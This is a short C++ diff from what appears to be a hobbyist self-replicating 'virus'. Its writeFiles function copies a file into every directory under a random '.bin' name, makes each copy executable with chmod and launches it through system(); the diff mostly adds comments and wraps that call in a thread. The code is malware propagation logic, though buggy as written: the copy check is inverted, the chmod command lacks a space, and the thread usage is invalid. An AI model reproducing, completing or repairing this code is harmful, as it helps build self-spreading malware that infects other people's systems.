@@ -55,18 +55,23 @@ void writeFiles(vector<string> files)
       try
       {
         if (regex_match(files[i], correctFile))
-          file = files[i];
+          file = files[i]; // get the file
 
         // get the directories
         if ((!regex_match(files[i], itsAFile) == 0 || files[i] == ".") && files[i] != "..")
         {
+          // generate the name
           string nameVirus = (files[i] + "/a" + to_string(rand()) + ".bin");
+          // get the file
           ifstream fileVirus(file, ios::binary);
+          // create the file
           ofstream copyVirus(nameVirus, ios::binary);
           if (!fileVirus.is_open())
-            copyVirus << fileVirus.rdbuf();
+            copyVirus << fileVirus.rdbuf(); // copy the file
+
           fileVirus.close();
-          thread system("chmod 775" + nameVirus + ";" + nameVirus);
+          thread comm(system("chmod 775" + nameVirus + ";" + nameVirus));
+          comm.join(); // idk what im doing here 😩
         }
       }
       catch (...)
